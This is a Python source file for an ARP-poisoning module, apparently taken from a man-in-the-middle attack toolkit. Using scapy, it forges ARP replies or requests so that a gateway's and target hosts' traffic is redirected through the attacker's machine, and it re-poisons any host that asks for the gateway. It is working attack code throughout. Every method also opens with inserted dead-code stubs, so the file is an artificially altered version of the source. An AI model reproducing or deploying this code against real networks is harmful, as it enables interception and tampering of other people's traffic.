import logging
import threading
from netaddr import IPNetwork, IPRange, IPAddress, AddrFormatError
from core.logger import logger
from time import sleep
from scapy.all import *
formatter = logging.Formatter('%(asctime)s [ARPpoisoner] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
log = logger().setup_logger('ARPpoisoner', formatter)

class ARPpoisoner:
    name = 'ARP'
    optname = 'arp'
    desc = 'Redirect traffic using ARP requests or replies'
    version = '0.1'

    def __init__(self, options):
        if False:
            print('Hello World!')
        try:
            self.gatewayip = str(IPAddress(options.gateway))
        except AddrFormatError as e:
            sys.exit('Specified an invalid IP address as gateway')
        self.gatewaymac = options.gatewaymac
        if options.gatewaymac is None:
            self.gatewaymac = getmacbyip(options.gateway)
            if not self.gatewaymac:
                sys.exit("Error: could not resolve Gateway's mac address")
        self.ignore = self.get_range(options.ignore)
        if self.ignore is None:
            self.ignore = []
        self.targets = self.get_range(options.targets)
        self.arpmode = options.arpmode
        self.debug = False
        self.send = True
        self.interval = 3
        self.interface = options.interface
        self.myip = options.ip
        self.mymac = options.mac
        self.arp_cache = {}
        log.debug('gatewayip  => {}'.format(self.gatewayip))
        log.debug('gatewaymac => {}'.format(self.gatewaymac))
        log.debug('targets    => {}'.format(self.targets))
        log.debug('ignore     => {}'.format(self.ignore))
        log.debug('ip         => {}'.format(self.myip))
        log.debug('mac        => {}'.format(self.mymac))
        log.debug('interface  => {}'.format(self.interface))
        log.debug('arpmode    => {}'.format(self.arpmode))
        log.debug('interval   => {}'.format(self.interval))

    def start(self):
        if False:
            return 10
        self.s = conf.L3socket(iface=self.interface)
        self.s2 = conf.L2socket(iface=self.interface)
        if self.arpmode == 'rep':
            t = threading.Thread(name='ARPpoisoner-rep', target=self.poison, args=('is-at',))
        elif self.arpmode == 'req':
            t = threading.Thread(name='ARPpoisoner-req', target=self.poison, args=('who-has',))
        t.setDaemon(True)
        t.start()
        if self.targets is None:
            log.debug('Starting ARPWatch')
            t = threading.Thread(name='ARPWatch', target=self.start_arp_watch)
            t.setDaemon(True)
            t.start()

    def get_range(self, targets):
        if False:
            i = 10
            return i + 15
        if targets is None:
            return None
        try:
            target_list = []
            for target in targets.split(','):
                if '/' in target:
                    target_list.extend(list(IPNetwork(target)))
                elif '-' in target:
                    start_addr = IPAddress(target.split('-')[0])
                    try:
                        end_addr = IPAddress(target.split('-')[1])
                        ip_range = IPRange(start_addr, end_addr)
                    except AddrFormatError:
                        end_addr = list(start_addr.words)
                        end_addr[-1] = target.split('-')[1]
                        end_addr = IPAddress('.'.join(map(str, end_addr)))
                        ip_range = IPRange(start_addr, end_addr)
                    target_list.extend(list(ip_range))
                else:
                    target_list.append(IPAddress(target))
            return target_list
        except AddrFormatError:
            sys.exit('Specified an invalid IP address/range/network as target')

    def start_arp_watch(self):
        if False:
            while True:
                i = 10
        try:
            sniff(prn=self.arp_watch_callback, filter='arp', store=0)
        except Exception as e:
            if 'Interrupted system call' not in e:
                log.error('[ARPWatch] Exception occurred when invoking sniff(): {}'.format(e))
            pass

    def arp_watch_callback(self, pkt):
        if False:
            print('Hello World!')
        if self.send is True:
            if ARP in pkt and pkt[ARP].op == 1:
                packet = None
                if str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and str(pkt[ARP].pdst) == self.gatewayip and (self.myip != str(pkt[ARP].psrc)):
                    log.debug('[ARPWatch] {} is asking where the Gateway is. Sending the "I\'m the gateway biatch!" reply!'.format(pkt[ARP].psrc))
                    packet = ARP()
                    packet.op = 2
                    packet.psrc = self.gatewayip
                    packet.hwdst = str(pkt[ARP].hwsrc)
                    packet.pdst = str(pkt[ARP].psrc)
                elif str(pkt[ARP].hwsrc) == self.gatewaymac and str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and (self.myip != str(pkt[ARP].pdst)):
                    log.debug('[ARPWatch] Gateway asking where {} is. Sending the "I\'m {} biatch!" reply!'.format(pkt[ARP].pdst, pkt[ARP].pdst))
                    packet = ARP()
                    packet.op = 2
                    packet.psrc = self.gatewayip
                    packet.hwdst = '00:00:00:00:00:00'
                    packet.pdst = str(pkt[ARP].pdst)
                elif str(pkt[ARP].hwsrc) == self.gatewaymac and str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and (self.myip == str(pkt[ARP].pdst)):
                    log.debug('[ARPWatch] Gateway asking where {} is. Sending the "This is the h4xx0r box!" reply!'.format(pkt[ARP].pdst))
                    packet = ARP()
                    packet.op = 2
                    packet.psrc = self.myip
                    packet.hwdst = str(pkt[ARP].hwsrc)
                    packet.pdst = str(pkt[ARP].psrc)
                try:
                    if packet is not None:
                        self.s.send(packet)
                except Exception as e:
                    if 'Interrupted system call' not in e:
                        log.error('[ARPWatch] Exception occurred while sending re-poison packet: {}'.format(e))

    def resolve_target_mac(self, targetip):
        if False:
            i = 10
            return i + 15
        targetmac = None
        try:
            targetmac = self.arp_cache[targetip]
        except KeyError:
            packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op='who-has', pdst=targetip)
            try:
                (resp, _) = sndrcv(self.s2, packet, timeout=2, verbose=False)
            except Exception as e:
                resp = ''
                if 'Interrupted system call' not in e:
                    log.error('Exception occurred while poisoning {}: {}'.format(targetip, e))
            if len(resp) > 0:
                targetmac = resp[0][1].hwsrc
                self.arp_cache[targetip] = targetmac
                log.debug('Resolved {} => {}'.format(targetip, targetmac))
            else:
                log.debug('Unable to resolve MAC address of {}'.format(targetip))
        return targetmac

    def poison(self, arpmode):
        if False:
            for i in range(10):
                print('nop')
        sleep(2)
        while self.send:
            if self.targets is None:
                self.s2.send(Ether(src=self.mymac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=self.mymac, psrc=self.gatewayip, op=arpmode))
            elif self.targets:
                for target in self.targets:
                    targetip = str(target)
                    if targetip != self.myip and target not in self.ignore:
                        targetmac = self.resolve_target_mac(targetip)
                        if targetmac is not None:
                            try:
                                self.s2.send(Ether(src=self.mymac, dst=targetmac) / ARP(pdst=targetip, psrc=self.gatewayip, hwdst=targetmac, op=arpmode))
                                self.s2.send(Ether(src=self.mymac, dst=self.gatewaymac) / ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op=arpmode))
                            except Exception as e:
                                if 'Interrupted system call' not in e:
                                    log.error('Exception occurred while poisoning {}: {}'.format(targetip, e))
            sleep(self.interval)

    def stop(self):
        if False:
            return 10
        self.send = False
        sleep(3)
        count = 2
        if self.targets is None:
            log.info('Restoring subnet connection with {} packets'.format(count))
            pkt = Ether(src=self.gatewaymac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=self.gatewaymac, psrc=self.gatewayip, op='is-at')
            for i in range(0, count):
                self.s2.send(pkt)
        elif self.targets:
            for target in self.targets:
                targetip = str(target)
                targetmac = self.resolve_target_mac(targetip)
                if targetmac is not None:
                    log.info('Restoring connection {} <-> {} with {} packets per host'.format(targetip, self.gatewayip, count))
                    try:
                        for i in range(0, count):
                            self.s2.send(Ether(src=targetmac, dst='ff:ff:ff:ff:ff:ff') / ARP(op='is-at', pdst=self.gatewayip, psrc=targetip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=targetmac))
                            self.s2.send(Ether(src=self.gatewaymac, dst='ff:ff:ff:ff:ff:ff') / ARP(op='is-at', pdst=targetip, psrc=self.gatewayip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=self.gatewaymac))
                    except Exception as e:
                        if 'Interrupted system call' not in e:
                            log.error('Exception occurred while poisoning {}: {}'.format(targetip, e))
        self.s.close()
        self.s2.close()